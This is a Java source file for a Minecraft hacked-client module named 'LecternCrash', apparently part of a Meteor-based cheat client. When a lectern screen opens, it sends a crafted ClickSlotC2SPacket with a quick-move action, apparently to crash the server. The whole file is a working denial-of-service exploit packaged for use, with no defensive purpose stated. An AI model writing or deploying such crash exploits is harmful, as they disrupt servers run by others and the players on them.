package dev.undefinedteam.gensh1n.system.modules.crash;

import it.unimi.dsi.fastutil.ints.Int2ObjectMaps;
import dev.undefinedteam.gensh1n.events.client.OpenScreenEvent;
import dev.undefinedteam.gensh1n.system.modules.Categories;
import dev.undefinedteam.gensh1n.system.modules.Module;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.client.gui.screen.ingame.LecternScreen;
import net.minecraft.network.packet.c2s.play.ClickSlotC2SPacket;
import net.minecraft.screen.slot.SlotActionType;


public class LecternCrash extends Module {

    public LecternCrash() {
        super(Categories.Crash, "lectern-crash", "Sends a funny packet when you open a lectern");
    }

    @EventHandler
    private void onOpenScreenEvent(OpenScreenEvent event) {
        if (!(event.screen instanceof LecternScreen)) return;
        mc.getNetworkHandler().sendPacket(new ClickSlotC2SPacket(mc.player.currentScreenHandler.syncId, mc.player.currentScreenHandler.getRevision(), 0, 0, SlotActionType.QUICK_MOVE, mc.player.currentScreenHandler.getCursorStack().copy(), Int2ObjectMaps.emptyMap()));
        toggle();
    }
}
